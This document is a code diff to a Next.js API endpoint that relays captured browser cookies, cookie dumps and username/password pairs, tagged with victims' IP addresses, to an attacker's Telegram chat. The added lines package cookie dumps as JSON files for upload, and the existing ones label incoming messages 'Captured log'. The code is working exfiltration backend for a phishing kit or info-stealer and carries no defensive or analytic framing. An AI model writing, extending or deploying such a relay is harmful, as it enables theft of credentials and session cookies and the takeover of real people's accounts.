@@ -1,11 +1,8 @@
-// api/relay.js
-
 import nextConnect from 'next-connect';
 import multer from 'multer';
 import FormData from 'form-data';
 
 export const config = { api: { bodyParser: false } };
-
 const upload = multer();
 const handler = nextConnect();
 
@@ -20,7 +17,7 @@ handler.post(async (req, res) => {
   }
   const botUrl = `https://api.telegram.org/bot${telegramToken}`;
 
-  // --- 1. File upload (cookies as .txt) ---
+  // --- 1. File upload (already a file, e.g. from worker's multipart) ---
   if (req.file) {
     const form = new FormData();
     form.append('chat_id', chatId);
@@ -32,7 +29,7 @@ handler.post(async (req, res) => {
         contentType: req.file.mimetype || 'text/plain'
       }
     );
-    // Optional: add a caption with extra info (ip/type)
+    // Optional caption
     const { ip, type } = req.body;
     let caption = '';
     if (ip) caption += `IP: ${ip}\n`;
@@ -52,7 +49,7 @@ handler.post(async (req, res) => {
     return res.status(200).json({ success: true });
   }
 
-  // --- 2. JSON (credentials or logs) ---
+  // --- 2. JSON (credentials or cookie-dump) ---
   if (req.headers['content-type']?.includes('application/json')) {
     let body = '';
     await new Promise((resolve, reject) => {
@@ -67,10 +64,41 @@ handler.post(async (req, res) => {
       return res.status(400).json({ success: false, message: 'Invalid JSON' });
     }
     const { data, ip, user, pass, type } = json;
+
+    // If this JSON is a cookie-dump, send as a file
+    if (type === 'cookie-file' || (data && typeof data === 'object' && data.cookies)) {
+      // Compose filename
+      const fname = `${ip || 'unknown'}-cookie-file.json`;
+      // Use stringified JSON as file content
+      const cookieJson = JSON.stringify(json, null, 2);
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append('document', Buffer.from(cookieJson, 'utf8'), {
+        filename: fname,
+        contentType: 'application/json'
+      });
+      let caption = ip ? `IP: ${ip}\n` : '';
+      if (type) caption += `Type: ${type}\n`;
+      if (caption) form.append('caption', caption);
+
+      const tgRes = await fetch(`${botUrl}/sendDocument`, {
+        method: 'POST',
+        body: form,
+        headers: form.getHeaders()
+      });
+      const tgText = await tgRes.text();
+      if (!tgRes.ok) {
+        console.error('Telegram API error (json file):', tgText);
+        return res.status(502).json({ success: false, error: tgText });
+      }
+      return res.status(200).json({ success: true });
+    }
+
+    // Otherwise: plain text log (credentials or generic log)
     let text = `📥 Captured log\n`;
     if (ip) text += `IP: ${ip}\n`;
     if (type) text += `Type: ${type}\n`;
-    if (data) text += `\n${data}`;
+    if (data) text += `\n${typeof data === 'object' ? JSON.stringify(data, null, 2) : data}`;
     else if (user && pass) text += `User: ${user}\nPass: ${pass}`;
     else text += JSON.stringify(json, null, 2);
 
@@ -87,7 +115,7 @@ handler.post(async (req, res) => {
     return res.status(200).json({ success: true });
   }
 
-  // --- 3. Any other payload type: error ---
+  // --- 3. Bad payload ---
   return res.status(400).json({ success: false, message: 'Bad payload' });
 });
 
